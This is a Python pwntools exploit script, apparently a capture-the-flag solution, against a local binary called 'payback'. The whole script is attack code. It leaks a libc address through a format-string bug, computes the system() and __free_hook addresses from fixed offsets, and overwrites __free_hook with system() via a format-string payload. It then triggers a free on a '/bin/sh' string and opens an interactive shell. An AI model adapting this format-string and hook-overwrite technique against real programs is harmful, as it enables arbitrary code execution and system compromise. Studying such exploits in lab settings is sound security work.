from pwn import *

context(os='linux', arch='amd64') 
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'

p = process('./payback')
#gdb.attach(p,"""b *delete_bot+202""")
#gdb.attach(p,"""b *printf+198""")

p.sendlineafter(">>","1")
p.sendlineafter(":","a")
p.sendlineafter(":","1")
p.sendlineafter(">>","3")
p.sendlineafter(":","0")
test = p.sendlineafter(":","%p")
p.recvuntil(":")
p.recvline()
lib_format = p.recvline()
log.success("libc leak: " + lib_format)
system = int(lib_format[2:],16)- 0x19b463
freehook = system + 0x19cb88
log.success ("system addr: " + hex(system))
log.success ("__free_hook addr: " + hex(freehook))
p.sendlineafter(">>","1")
p.sendlineafter(":","/bin/sh")
p.sendlineafter(":","1")
p.sendlineafter(">>","3")

fmt = fmtstr_payload(8,{freehook:system}) # overwrite __free_hook with system() addr
p.sendlineafter(":","0")
test = p.sendlineafter(":",fmt)

p.sendlineafter(">>","1")
p.sendlineafter(":","/bin/sh")
p.sendlineafter(":","1")
p.sendlineafter(">>","3")
p.sendlineafter(":","0")
test = p.sendlineafter(":","0")
p.interactive()
